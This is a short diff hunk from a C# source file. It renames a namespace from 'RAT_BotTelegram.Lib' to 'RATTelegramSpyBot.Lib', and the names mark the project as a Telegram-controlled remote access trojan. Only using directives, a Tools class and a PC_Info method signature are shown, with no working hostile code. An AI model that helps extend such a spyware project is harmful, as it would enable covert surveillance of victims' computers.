@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-namespace RAT_BotTelegram.Lib {
+namespace RATTelegramSpyBot.Lib {
     internal sealed class Tools {
 
         public static String PC_Info() {
